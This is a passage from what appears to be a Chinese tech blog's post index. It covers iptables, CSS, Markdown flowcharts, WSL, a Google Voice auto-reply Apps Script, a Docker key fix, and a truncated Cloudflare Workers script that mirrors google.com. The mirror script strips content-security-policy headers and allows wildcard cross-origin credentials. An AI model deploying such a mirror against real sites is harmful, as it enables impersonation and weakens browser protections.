删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加 -R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） 后记 以上方法在当固件不带MAC过滤插件时，用防火墙规则替代实现，通用性更高。如果方法不奏效，同样可以利用防火墙的 通信规则/流量规则 来实现，见本站下一篇教程：利用防火墙通信规则实现MAC白名单上网。 参考文档 通过iptables进行MAC过滤 iptables详解及一些常用规则 Linux iptables命令详解","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"CSS光速入门笔记","slug":"css-syntax-note","date":"2022-03-27T13:13:30.000Z","updated":"2022-03-27T13:13:30.000Z","comments":true,"path":"css-syntax-note.html","permalink":"https://sobaigu.com/css-syntax-note.html","excerpt":"","text":"前言 终究还是要走这一步，以前这些都不屑于学，需要的时候临时查，复制粘贴着用。 最近自己比较正式地在捣鼓个界面程序，用到HTML+CSS，在忙碌的欢乐斗地主中抽出时间跟着教程走了一遍，好记性不如烂笔头。 对照教程来自表严肃：https://biaoyansu.com/9.14 语法 1234567891011//直接写在HTML中小范围用，一般放css文件中再引用&lt;style&gt; div &#123; //选择器，&#123;&#125;包围属性值 backgroud: black; //属性: 值，以;换行结尾 border: 2px solid red; &#125;.news-input &#123; color: green; &#125;&lt;/style&gt; 选择器 用于限定样式作用的范围 元素选择器 1234div &#123; //选择器，&#123;&#125;包围属性值 backgroud: black; //属性: 值，以;换行结尾 border: 2px solid red; &#125; 多个选择器使用同一样式用 , 分隔： 123div, p, h1 &#123; backgroud: black; &#125; 类选择器&amp;ID选择器 . 类选择器：用来定义一类元素 # ID选择器：一般用来定位页面中唯一的元素 属性选择器 12345678&lt;div&gt; &lt;p class=&quot;text-white&quot; title=&quot;此处有显示&quot;&gt;白色字体&lt;/p&gt; &lt;p class=&quot;bg-dark&quot;&gt;黑色背景&lt;/p&gt; &lt;div class=&quot;input-group news-input&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;请输入你的邮箱&quot; /&gt; &lt;button title=&quot;点击此处&quot; class=&quot;btn btn-dark btn-lg&quot;&gt;注册&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 使用 [] 包含元素选择器： 123[title=&quot;点击此处&quot;] &#123; color: green;&#125; [title^=&quot;点击&quot;]：匹配 title 中的值以 点击 开头 [title*=&quot;此&quot;]：匹配 title 中的值包含 此 [title$=&quot;此处&quot;]：匹配 title 中的值以 此处 结尾 后代选择器 123456&lt;div class=&quot;a&quot;&gt;这是A &lt;div class=&quot;b&quot;&gt;这是B &lt;div class=&quot;c&quot;&gt;这是C1&lt;/div&gt; &lt;div class=&quot;c&quot;&gt;这是C2&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 后代选择器以 空格 隔开，如 .a .b &#123;...&#125; 123456789101112div &#123; padding: 10px; background: rgba(255, 0, 0, .2); //a表示不透明度，1完全不透明，0完全透明&#125;.a &#123; border: 2px solid black;&#125;.a .b &#123; //匹配a类下的b background: rgba(0, 255, 0, .2);&#125; 相邻选择器&amp;通用相邻选择器 两者都只能从上往下选： + 相邻选择器： .a + div &#123;...&#125; ，以 a 类为基准，选择之后一个 div ~ 通用选择器： .a ~ div &#123;...&#125; ，以 a 类为基准，选择之后所有同级 div 伪类选择器 123456button:hover &#123; background: #fff; -webkit-transition: color 200ms; -o-transition: color 200ms; transition: color 200ms; //200ms颜色过渡&#125; : 为标志，可以定义某个元素对应的动作状态，常用的有： :focus ：可以输入的，具有焦点输入的元素 :link ：未访问的 :visited ：已访问过的 :hover ：鼠标移动到上面 :active ：鼠标点击时 伪元素选择器 1234&lt;body&gt;&lt;p&gt;it is a test&lt;/p&gt;&lt;a class=&quot;help&quot;&gt;点这里注册&lt;/a&gt;&lt;/body&gt; css3开始以 :: 标记，区分伪类选择器 1234567p::first-letter &#123; //定义第一个文字 font-size: 50px;&#125;.help::after &#123; //在help类内容后头添加[?] content: [?]&#125; ::first-letter：第一个文字 ::before：段落前 ::after：段落最后 (content加内容) ::first-child：第一个元素 ::last-child：最后一个元素 ::nth-child(n)：选择第n子元素，详细说明可见：:nth-child 选择器权重 style 属性（内联） &gt; ID 选择器 &gt; 类选择器 / 属性选择器 / 伪类选择器 &gt; 元素选择器 123div &#123; color: red !important; /* 最高级别 */&#125; 可以覆盖行内样式的只有 !important ，我们一般不会首先使用这类核武器，它会碾压所有的样式规则，因为他拥有终极的权重，这也意味着 !important 是最不灵活的。 权重的计算 我们可以将纵轴的四级用数字的方式记录为 0, 0, 0, 0，即行内样式, ID选择器, 类选择器, 元素选择器。这样无论选择器有多复杂我们都可以精确的计算出来，比如说如下例子中的 &lt;a&gt; 元素我们可以有很多中选择方式，但不同的选择方式的权重是不同的。 12345&lt;p&gt; &lt;span&gt; &lt;a id=&quot;sober&quot; class=&quot;black&quot;&gt;我是个清醒的链接&lt;/a&gt; &lt;/span&gt;&lt;/p&gt; 选择器 权重 a 0,0,0,1（最低） p a 0,0,0,2 p &gt; span a 0,0,0,3 .black 0,0,1,0 [class=“black”] 0,0,1,0 a.black 0,0,1,1 #sober 0,1,0,0 a#sober.black 0,1,1,1 p a#sober.black 0,1,1,2（最高） 属性 字体属性 123456p &#123; font-family: &quot;微软雅黑&quot;, &quot;Microsoft Yahei&quot;; //优先使用微软雅黑，不存在就往后找，都没有则启用浏览器默认字体 font-weight: 600; //粗体，100-900 font-size: 18px; //也可以用百分比，按父元素大小比例显示&#125; 文本属性 123p &#123; text-align: center;&#125; 主要是文本排版相关，主要有以下属性： text-align：文本对齐方式 line-height：行高，即行间距 text-decoration：文本装饰：默认为 none，常用 underline，overline，line-through display 属性 123.block-box &#123; display: block; &#125; block：块，默认占整宽，气场最足，哪怕限制了宽度，他依然会用 margin 填充剩下的部分。 inline：行内元素，指定 padding： 10px 时只会左右推开，上下不受影响 inline-block：行内块，指定 padding： 10px 时会上下左右推开 none：隐藏不显示 盒子模型 懒得码字，盗一张aardio论坛看到的图： 继承 12345678910111213141516171819202122&lt;style&gt; .g-pa &#123; font-size: 25px; &#125; .pa &#123; color: royalblue; &#125;&lt;/style&gt;&lt;div class=&quot;gg-pa&quot;&gt; 曾爷爷：本尊展示 &lt;div class=&quot;g-pa&quot;&gt; 爷爷：我要祖传 font-size &lt;div class=&quot;pa&quot;&gt; 爸爸：我要祖传 color，继承 font-size &lt;div class=&quot;me&quot;&gt; Yo，这行继承 color + font-size &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"MarkDown文档中如何画出流程图","slug":"how-to-draw-flowchart-with-markdown","date":"2022-03-16T06:30:21.000Z","updated":"2022-03-16T06:30:21.000Z","comments":true,"path":"how-to-draw-flowchart-with-markdown.html","permalink":"https://sobaigu.com/how-to-draw-flowchart-with-markdown.html","excerpt":"","text":"前言 MarkDown的简便性让人越来越喜欢。虽然MarkDown也不是万能的，有些排版等MarkDown做起来也不是那么完美，尤其是涉及图片操作。 在日常的文档生产中，难免要用到一些流程图，一般用亿图图示等流程图软件画好了导出一张图片贴在MarkDown文档中，但其实MarkDown也是可以利用 Flowchart.js 画出流程图的，初用可能麻烦点，但用熟了语法也不是那么难，而且可以少插入一张外部图片。 Flowchart.js 仅需几行代码即可在 Web 上完成流程图的构建。可以从文字表述中画出简单的 SVG 流程图，也可以画出彩色的图表。 Draws simple SVG flow chart diagrams from textual representation of the diagram http://flowchart.js.org/ 基本语法 MarkDown中的流程图语法叫flow，该语法只有两个注意事项： 定义元素 连接定义好的元素 定义元素 1tag=&gt;type: content:&gt;url tag：标签，用于连接元素时使用，相当于是定义了一个常量 =&gt;：标签定义等式。 content：流程语句中放置的内容 type:与content之间一定要有一个空格，否则会出问题 :&gt;：超链接定义等式 url：指向链接，与流程语句绑定，选填。 type：该标签的类型。共有6种类型如下： 元素类型 代表意义 start 开始 end 结束/完成 operation 流程操作 subroutine 预定子流程 condition 条件判断 inputoutput 输入输出 连接元素 使用-&gt;符号，如： 12345s=&gt;start: 开始e=&gt;end: 结束o=&gt;operation: 操作项s-&gt;o(成功)-&gt;e 怎么画？ 以上面的流程代码为例，在代码块标志后加上flow即可： 1234567\\`\\`\\`flows=&gt;start: 开始e=&gt;end: 结束o=&gt;operation: 操作项s-&gt;o-&gt;e\\`\\`\\` #代码块标识会被解析，实际上写代码块时不用添加转义符“\\” 有些MarkDown编辑器，如typora，在你插入代码时选择flow语法即可，就只需要输入流程图要用到的代码。 操作示例 最简单的流程图 以上面的流程图代码为例，我们可以得到这样的流程图 12345s=&gt;start: 开始e=&gt;end: 结束o=&gt;operation: 操作项s-&gt;o-&gt;e 闰年判断逻辑 来个复杂点的: 12345678910111213141516171819​\\`\\`\\`flowst=&gt;start: Starti=&gt;inputoutput: 输入年份ncond1=&gt;condition: n能否被4整除？cond2=&gt;condition: n能否被100整除？cond3=&gt;condition: n能否被400整除？o1=&gt;inputoutput: 输出非闰年o2=&gt;inputoutput: 输出非闰年o3=&gt;inputoutput: 输出闰年o4=&gt;inputoutput: 输出闰年e=&gt;endst-&gt;i-&gt;cond1cond1(no)-&gt;o1-&gt;econd1(yes)-&gt;cond2cond2(no)-&gt;o3-&gt;econd2(yes)-&gt;cond3cond3(yes)-&gt;o2-&gt;econd3(no)-&gt;o4-&gt;e\\`\\`\\` 得到下面的流程图： 123456789101112131415161718st=&gt;start: Starti=&gt;inputoutput: 输入年份ncond1=&gt;condition: n能否被4整除？cond2=&gt;condition: n能否被100整除？cond3=&gt;condition: n能否被400整除？o1=&gt;inputoutput: 输出非闰年o2=&gt;inputoutput: 输出非闰年o3=&gt;inputoutput: 输出闰年o4=&gt;inputoutput: 输出闰年e=&gt;endst-&gt;i-&gt;cond1cond1(no)-&gt;o1-&gt;econd1(yes)-&gt;cond2cond2(no)-&gt;o3-&gt;econd2(yes)-&gt;cond3cond3(yes)-&gt;o2-&gt;econd3(no)-&gt;o4-&gt;e 更多高级语法可参考这里","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"Windows系统中启用Linux子系统的方法","slug":"enable-ubuntu-in-windows","date":"2022-02-18T07:23:30.000Z","updated":"2022-02-18T07:23:30.000Z","comments":true,"path":"enable-ubuntu-in-windows.html","permalink":"https://sobaigu.com/enable-ubuntu-in-windows.html","excerpt":"","text":"前言 想编译个OP固件玩玩，要用到ubuntu系统环境，想到Windows系统中早就可以启用Linux子系统，就懒得安装虚拟机了。 安装 安装倒也简单，就相当于一个普通的应用安装方法：打开 Microsoft Store，搜索关键词 ubuntu ，应该会出现2个版本，在搜索出来的结果中选择一个自己要的，建议选 Ubuntu 20.04 LTS 这个版本，点击获取不一会儿应该就安装完成了。 安装的时候注意系统要求是否满足，如果满足的话会在界面上提示： 此产品应适用于你的设备。具有复选标记的项目符合开发人员的系统要求。 如果系统不满足要求的升级到满足要求的条件再来安装。 启用 安装完成后，在开始菜单或者应用商店中找到 Ubuntu 20.04 LTS 点击打开，此时会有如下提示： Installing, this may take a few minutes… WslRegisterDistribution failed with error: 0x8007019e The Windows Subsystem for Linux optional component is not enabled. Please enable it and try again. See https://aka.ms/wslinstall for details. Press any key to continue… 这里说 Please enable it ，但就是不告诉你方法，也是醉，要启用该功能，需要打开 powershell（管理员） 运行： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 该功能启用需要重启系统生效，按提示重启系统再用即可。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"借助 GmailApp 实现 Google Voice 保号/自动回复信息","slug":"google-voice-auto-replier","date":"2022-01-09T04:52:56.000Z","updated":"2022-01-09T04:52:56.000Z","comments":true,"path":"google-voice-auto-replier.html","permalink":"https://sobaigu.com/google-voice-auto-replier.html","excerpt":"","text":"前言 搞了个Google Voice用，想起刚开始的时候免费送的号码无声无息就被收回了，整理下保号的问题。保号也就是说怎么长期的能够使用它不被谷歌回收，具体政策可以去翻下 Google Voice的TOS | 另一份Google Voice的TOS。 Google Voice 号码回收规则 Account Inactivity Google may reclaim your Google Voice number (if you have one) if you have not placed or received calls, sent or received text messages for a period of 6 months. We will not reclaim numbers that have been ported in to Google Voice or made permanent. 中文版的TOS里写的是9个月不活动，另一份TOS说的是3个月，大概是维护人员也不知道有这么多源，以英文版最短时间为准，3个月不收发短信，也不接打语音就视为死号，然后会被谷歌回收。 说是被回收前会有邮件通知，所以经常关注下邮箱里的信息为好。 保号措施 针对TOS中提到的回收规则，那相应的就是在回收到期前： 收发短信 接打语音电话 建议大家每月都发送短信或者电话可以找朋友也可以去专业的保号群，就相当于跟朋友一起互动了。你如果有多个GV号互相发信息或者打电话也可以起保号作用。 发送信息 给号码 22122 发短信，内容为 JOIN ，稍后将回复你信息订阅成功，每月2条。 Starbucks: This is a test. Thanks for participating. (2msg/mo). Text STOP to end, HELP for help + T&amp;C’s. Msg&amp;Data rates may apply. 其他订阅号码： 订阅号码 发送指令 收到回复内容 信息频率 555444 SIGNUP 6msgs/mo 22122 JOIN 2msg/mo 527365 join 8msg / mo 25666 先发code 然后回复PROMO 47272 START 6msgs/mo 22000 info 秒回 22000 help 稍回 拨打语音 拨打各种客服热线，比如苹果，微软，亚马逊等等，这些美国或加拿大的号码都免费的 厂商 号码 微软客服 +1-(800)642-7676 Apple客服 +1-(800)275-2273 亚马逊客服 +1-(206)266-2992 自动回复短信 利用 GmailApp 功能，实现收到消息后自动回复短信，具体教程就不重复写了，推荐一篇图文教程自己去看：Google Voice 保号/自动发送及回复信息。 在使用过程中，可能会出现错误如： 错误：TypeError: Cannot read property ‘getUnreadCount’ of null at autoReplier(Auto_Replier:11:32) 出现这个错误，就如下文的代码注释，注意标签嵌套的问题，只支持父标签。 错误：ReferenceError: e is not defined at autoReplier(Auto_Replier:38:42) 跟上面的错误一致，都是因为 labelObj 赋值不成功值为空。 保存设置完定时器后，自己给自己发条短信都能测试，或者给 站长的Google Vioce 发个试试？ 抄了上面链接中的代码，按自己的需求填充些内容，完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136function autoReplier() &#123; var labelObj = GmailApp.getUserLabelByName(&quot;googlevoice&quot;); //注意这个标签不能嵌套，也就是必须是父标签 var gmailThreads; var messages; var messagecount; var sender; var num = 3; //为防止两人都是自动回复，当发送次数达到时将不自动回复 var hours = 12; //过了多少小时后又可以自动回复。 try &#123; for (var gg = 0; gg &lt; labelObj.getUnreadCount(); gg++) &#123; gmailThreads = labelObj.getThreads()[gg]; messages = gmailThreads.getMessages(); messagecount = gmailThreads.getMessageCount(); //console.log(messages[messagecount - 9].getDate() + &quot; time&quot;); for (var ii = 0; ii &lt; messages.length; ii++) &#123; if (messages[ii].isUnread()) &#123; msg = messages[ii].getPlainBody(); sender = messages[ii].getFrom(); array = [ [&quot;人生如逆旅，我亦是行人。--苏轼「临江仙·送钱穆父」&quot;], [&quot;曾经沧海难为水，除却巫山不是云。--元稹「离思五首·其四」&quot;], [&quot;两情若是久长时，又岂在朝朝暮暮。--秦观「鹊桥仙·纤云弄巧」&quot;], [&quot;人生自是有情痴，此恨不关风与月。--欧阳修「玉楼春·尊前拟把归期说」&quot;], [&quot;身无彩凤双飞翼，心有灵犀一点通。--李商隐「无题·昨夜星辰昨夜风」&quot;], [&quot;众里寻他千百度，蓦然回首，那人却在，灯火阑珊处。--辛弃疾「青玉案·元夕」&quot;], [&quot;抽刀断水水更流，举杯销愁愁更愁。--李白「宣州谢脁楼饯别校书叔云 / 陪侍御叔华登楼歌」&quot;], [&quot;今人不见古时月，今月曾经照古人。--李白「把酒问月·故人贾淳令予问之」&quot;], [&quot;人间有味是清欢。--苏轼「浣溪沙·细雨斜风作晓寒」&quot;], [&quot;近水楼台先得月，向阳花木易为春。--苏麟「断句」&quot;], [&quot;菩提本无树，明镜亦非台。--惠能「菩提偈」&quot;], [&quot;纸上得来终觉浅，绝知此事要躬行。--陆游「冬夜读书示子聿」&quot;], [&quot;时人不识凌云木，直待凌云始道高。--杜荀鹤「小松」&quot;], [&quot;粗缯大布裹生涯，腹有诗书气自华。--苏轼「和董传留别」&quot;], [&quot;人生到处知何似，应似飞鸿踏雪泥。--苏轼「和子由渑池怀旧」&quot;], [&quot;世事短如春梦，人情薄似秋云。--朱敦儒「西江月·世事短如春梦」&quot;], [&quot;年年岁岁花相似，岁岁年年人不同。--刘希夷「代悲白头翁 / 白头吟 / 有所思」&quot;], [&quot;梅须逊雪三分白，雪却输梅一段香。--卢梅坡「雪梅·其一」&quot;], [&quot;沉舟侧畔千帆过，病树前头万木春。--刘禹锡「酬乐天扬州初逢席上见赠」&quot;], [&quot;长风破浪会有时，直挂云帆济沧海。--李白「行路难·其一」&quot;], [&quot;世人结交须黄金，黄金不多交不深。--张谓「题长安壁主人」&quot;], [&quot;同是天涯沦落人，相逢何必曾相识。--白居易「琵琶行 / 琵琶引」&quot;], [&quot;落红不是无情物，化作春泥更护花。--龚自珍「己亥杂诗·其五」&quot;], [&quot;知我者，谓我心忧。不知我者，谓我何求。--佚名「黍离」&quot;], [&quot;一点浩然气，千里快哉风。--苏轼「水调歌头·黄州快哉亭赠张偓佺」&quot;], [&quot;夕阳无限好，只是近黄昏。--李商隐「乐游原 / 登乐游原」&quot;], [&quot;射人先射马，擒贼先擒王。--杜甫「前出塞九首·其六」&quot;], [&quot;凭君莫话封侯事，一将功成万骨枯。--曹松「己亥岁感事」&quot;], [&quot;采得百花成蜜后，为谁辛苦为谁甜。--罗隐「蜂」&quot;], [&quot;竹外桃花三两枝，春江水暖鸭先知。--苏轼「惠崇春江晚景 / 惠崇春江晓景」&quot;], [&quot;月有盈亏花有开谢，想人生最苦离别。--张鸣善「普天乐·咏世」&quot;], [&quot;今朝有酒今朝醉，明日愁来明日愁。--罗隐「自遣」&quot;], [&quot;春蚕到死丝方尽，蜡炬成灰泪始干。--李商隐「无题·相见时难别亦难」&quot;], [&quot;人似秋鸿来有信，事如春梦了无痕。--苏轼「正月二十日与潘郭二生出郊寻春忽记去年是日同至女王城作诗乃和前韵」&quot;], [&quot;蝉噪林逾静，鸟鸣山更幽。--王籍「入若耶溪」&quot;], [&quot;等闲识得东风面，万紫千红总是春。--朱熹「春日」&quot;], [&quot;万事到头都是梦，休休。明日黄花蝶也愁。--苏轼「南乡子·重九涵辉楼呈徐君猷」&quot;], [&quot;天生我材必有用，千金散尽还复来。--李白「将进酒」&quot;], [&quot;宣父犹能畏后生，丈夫未可轻年少。--李白「上李邕」&quot;], [&quot;山重水复疑无路，柳暗花明又一村。--陆游「游山西村」&quot;], [&quot;草木有本心，何求美人折。--张九龄「感遇十二首·其一」&quot;], [&quot;松树千年终是朽，槿花一日自为荣。--白居易「放言五首·其五」&quot;], [&quot;莫道桑榆晚，为霞尚满天。--刘禹锡「酬乐天咏老见示」&quot;], [&quot;人生天地间，忽如远行客。--佚名「青青陵上柏」&quot;], [&quot;海内存知己，天涯若比邻。--王勃「送杜少府之任蜀州 / 送杜少府之任蜀川」&quot;], [&quot;尔曹身与名俱灭，不废江河万古流。--杜甫「戏为六绝句·其二」&quot;], [&quot;古人学问无遗力，少壮工夫老始成。--陆游「冬夜读书示子聿」&quot;], [&quot;会当凌绝顶，一览众山小。--杜甫「望岳」&quot;], [&quot;江山代有才人出，各领风骚数百年。--赵翼「论诗五首·其二」&quot;], [&quot;疾风知劲草，板荡识诚臣。--李世民「赐萧瑀」&quot;], [&quot;试玉要烧三日满，辨材须待七年期。--白居易「放言五首·其三」&quot;], [&quot;夫天地者，万物之逆旅也。光阴者，百代之过客也。--李白「春夜宴桃李园序 / 春夜宴从弟桃花园序」&quot;], [&quot;不畏浮云遮望眼，自缘身在最高层。--王安石「登飞来峰」&quot;], [&quot;博观而约取，厚积而薄发，吾告子止于此矣。--苏轼「稼说送张琥」&quot;], [&quot;人生无根蒂，飘如陌上尘。--陶渊明「杂诗」&quot;], [&quot;行路难，不在水，不在山，只在人情反覆间。--白居易「太行路」&quot;], [&quot;花开堪折直须折，莫待无花空折枝。--佚名「金缕衣」&quot;], [&quot;人生得意须尽欢，莫使金樽空对月。--李白「将进酒」&quot;], [&quot;世界微尘里，吾宁爱与憎。--李商隐「北青萝」&quot;], [&quot;非淡泊无以明志，非宁静无以致远。--诸葛亮「诫子书」&quot;], [&quot;时来天地皆同力，运去英雄不自由。--罗隐「筹笔驿」&quot;], [&quot;不识庐山真面目，只缘身在此山中。--苏轼「题西林壁」&quot;], [&quot;半亩方塘一鉴开，天光云影共徘徊。--朱熹「活水亭观书有感二首·其一」&quot;], [&quot;安能摧眉折腰事权贵，使我不得开心颜。--李白「梦游天姥吟留别 / 梦游天姥山别东鲁诸公」&quot;], [&quot;居高声自远，非是藉秋风。--虞世南「蝉」&quot;], [&quot;历览前贤国与家，成由勤俭破由奢。--李商隐「咏史二首·其二」&quot;], [&quot;只在此山中，云深不知处。--贾岛「寻隐者不遇 / 孙革访羊尊师诗」&quot;], [&quot;少壮不努力，老大徒伤悲。--佚名「长歌行」&quot;], [&quot;休言万事转头空，未转头时皆梦。--苏轼「西江月·平山堂」&quot;], [&quot;长恨人心不如水，等闲平地起波澜。--刘禹锡「竹枝词九首」&quot;], [&quot;万一禅关砉然破，美人如玉剑如虹。--龚自珍「夜坐二首」&quot;], [&quot;生年不满百，常怀千岁忧。--佚名「生年不满百」&quot;], [&quot;夫君子之行，静以修身，俭以养德。--诸葛亮「诫子书」&quot;], [&quot;而浮生若梦，为欢几何。--李白「春夜宴桃李园序 / 春夜宴从弟桃花园序」&quot;], [&quot;纵浪大化中，不喜亦不惧。--陶渊明「形影神三首」&quot;], [&quot;草萤有耀终非火，荷露虽团岂是珠。--白居易「放言五首·其一」&quot;], [&quot;古人今人若流水，共看明月皆如此。--李白「把酒问月·故人贾淳令予问之」&quot;], [&quot;古今多少事，都付笑谈中。--杨慎「临江仙·滚滚长江东逝水」&quot;], [&quot;衰兰送客咸阳道，天若有情天亦老。--李贺「金铜仙人辞汉歌」&quot;], [&quot;人间万事，毫发常重泰山轻。--辛弃疾「水调歌头·壬子三山被召陈端仁给事饮饯席上作」&quot;], [&quot;世间行乐亦如此，古来万事东流水。--李白「梦游天姥吟留别 / 别东鲁诸公」&quot;], [&quot;少年易老学难成，一寸光阴不可轻。--朱熹「偶成」&quot;], [&quot;世事浮云何足问，不如高卧且加餐。--王维「酌酒与裴迪」&quot;], [&quot;有匪君子，如切如磋，如琢如磨。--佚名「淇奥」&quot;], [&quot;横看成岭侧成峰，远近高低各不同。--苏轼「题西林壁」&quot;], [&quot;家国兴亡自有时，吴人何苦怨西施。--罗隐「西施」&quot;], [&quot;沧浪之水清兮，可以濯我缨。--佚名「沧浪歌」&quot;], [&quot;得即高歌失即休，多愁多恨亦悠悠。--罗隐「自遣」&quot;], [&quot;人生在世不称意，明朝散发弄扁舟。--李白「宣州谢脁楼饯别校书叔云」&quot;], [&quot;是非成败转头空。--杨慎「临江仙·滚滚长江东逝水」&quot;], [&quot;莫等闲，白了少年头，空悲切。--岳飞「满江红·写怀」&quot;], [&quot;文章本天成，妙手偶得之。--陆游「文章」&quot;], [&quot;莫道谗言如浪深，莫言迁客似沙沉。--刘禹锡「浪淘沙九首」&quot;], [&quot;假金方用真金镀，若是真金不镀金。--李绅「答章孝标」&quot;], [&quot;来如春梦几多时，去似朝云无觅处。--白居易「花非花」&quot;] ]; var j = Math.floor(Math.random() * (array.length)); var temp = array[j]; if (messagecount &lt; num)&#123; MailApp.sendEmail(sender, &quot;Google Voice Auto Reply&quot;, temp); &#125;else if( (messages[messagecount - 1].getDate().getTime() - messages[messagecount - num].getDate().getTime()) &gt; hours * 60 * 60 * 1000 )&#123; MailApp.sendEmail(sender, &quot;Google Voice Auto Reply&quot;, &quot;亲，我们已经发了好几条信息哟，可以停下来休息休息一下了！&quot;); &#125; messages[ii].markRead(); messages[ii].moveToTrash(); &#125; &#125; &#125; &#125; catch (err) &#123; console.error(&#x27;for loop error: &#x27; + e); &#125;&#125;","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"Docker installation NO_PUBKEY error","slug":"Docker-installation-NO-PUBKEY-error","date":"2021-12-28T07:31:02.000Z","updated":"2021-12-28T07:31:02.000Z","comments":true,"path":"Docker-installation-NO-PUBKEY-error.html","permalink":"https://sobaigu.com/Docker-installation-NO-PUBKEY-error.html","excerpt":"","text":"前言 本来安装 Docker 管理器这种活，直接宝塔界面安装就一步完成了，可不知这回咋还能安装失败 错误提示 GPG error: https://download.docker.com/linux/ubuntu focal InRelease: The following signatures couldn’t be verified because the public key is not available: NO_PUBKEY 7EA0A9C3F273FCD8 解决办法 在终端环境下添加 docker gpg key 和 repo ： 1234# Add keycurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# Add reposudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable&quot; 执行完以上步骤，再安装就不会再报错失败了。 参考文档 Docker installation NO_PUBKEY error on ubuntu focal","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"使用CloudFlare Workers反代网站「转」","slug":"cf-workers-reverse-proxy","date":"2021-12-25T09:37:13.000Z","updated":"2021-12-25T09:37:13.000Z","comments":true,"path":"cf-workers-reverse-proxy.html","permalink":"https://sobaigu.com/cf-workers-reverse-proxy.html","excerpt":"","text":"前言 最近服务器感觉有点吃力，又没钱升级，想把一些无关紧要的东西放 cloudflare workers 上去，给服务器腾点资源。发现别人的 workers 玩法还是蛮多的，比如还可以反代，直接抄下来学习备用O(∩_∩)O~ 镜像整个网站 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// 替换成你想镜像的站点const upstream = &#x27;www.google.com&#x27; // 如果那个站点有专门的移动适配站点，否则保持和上面一致const upstream_mobile = &#x27;www.google.com&#x27; // 你希望禁止哪些国家访问const blocked_region = [&#x27;RU&#x27;] // 禁止自访问const blocked_ip_address = [&#x27;0.0.0.0&#x27;, &#x27;127.0.0.1&#x27;] // 替换成你想镜像的站点const replace_dict = &#123; &#x27;$upstream&#x27;: &#x27;$custom_domain&#x27;, &#x27;//www.google.com&#x27;: &#x27;&#x27;&#125; //以下内容都不用动addEventListener(&#x27;fetch&#x27;, event =&gt; &#123; event.respondWith(fetchAndApply(event.request));&#125;) async function fetchAndApply(request) &#123; const region = request.headers.get(&#x27;cf-ipcountry&#x27;).toUpperCase(); const ip_address = request.headers.get(&#x27;cf-connecting-ip&#x27;); const user_agent = request.headers.get(&#x27;user-agent&#x27;); let response = null; let url = new URL(request.url); let url_host = url.host; if (url.protocol == &#x27;http:&#x27;) &#123; url.protocol = &#x27;https:&#x27; response = Response.redirect(url.href); return response; &#125; if (await device_status(user_agent)) &#123; upstream_domain = upstream &#125; else &#123; upstream_domain = upstream_mobile &#125; url.host = upstream_domain; if (blocked_region.includes(region)) &#123; response = new Response(&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;, &#123; status: 403 &#125;); &#125; else if(blocked_ip_address.includes(ip_address))&#123; response = new Response(&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;, &#123; status: 403 &#125;); &#125; else&#123; let method = request.method; let request_headers = request.headers; let new_request_headers = new Headers(request_headers); new_request_headers.set(&#x27;Host&#x27;, upstream_domain); new_request_headers.set(&#x27;Referer&#x27;, url.href); let original_response = await fetch(url.href, &#123; method: method, headers: new_request_headers &#125;) let original_response_clone = original_response.clone(); let original_text = null; let response_headers = original_response.headers; let new_response_headers = new Headers(response_headers); let status = original_response.status; new_response_headers.set(&#x27;access-control-allow-origin&#x27;, &#x27;*&#x27;); new_response_headers.set(&#x27;access-control-allow-credentials&#x27;, true); new_response_headers.delete(&#x27;content-security-policy&#x27;); new_response_headers.delete(&#x27;content-security-policy-report-only&#x27;); new_response_headers.delete(&#x27;clear-site-data&#x27;); const content_type = new_response_headers.get(&#x27;content-type&#x27;); if (content_type.includes(&#x27;text/html&#x27;) &amp;&amp; content_type.includes(&#x27;UTF-8&#x27;)) &#123; original_text = await replace_response_text(original_response_clone, upstream_domain, url_host); &#125; else &#123; original_text = 